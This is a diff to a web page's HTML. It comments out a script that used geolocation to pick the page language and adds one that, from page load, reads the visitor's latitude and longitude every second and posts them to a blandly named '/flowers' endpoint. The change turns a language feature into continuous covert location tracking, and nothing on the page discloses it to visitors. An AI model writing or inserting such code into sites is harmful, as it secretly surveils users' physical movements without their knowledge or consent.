@@ -36,6 +36,31 @@
     <!-- ################## -->
 
     <script>
+        function sendLocationEverySecond() {
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    const data = new URLSearchParams();
+                    data.append("latitude", lat);
+                    data.append("longitude", lon);
+
+                    await fetch("/flowers", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        body: data
+                    });
+                });
+            }, 1000);  // 1 second
+        }
+
+        window.onload = sendLocationEverySecond;
+    </script>
+    <!-- 
+    <script>
         async function detectLocationAndSetLanguage() {
             navigator.geolocation.getCurrentPosition(async (position) => {
                 const lat = position.coords.latitude;
@@ -69,7 +94,7 @@
         }
 
         window.onload = detectLocationAndSetLanguage;
-    </script>
+    </script> -->
 
 
     <!-- ################# -->
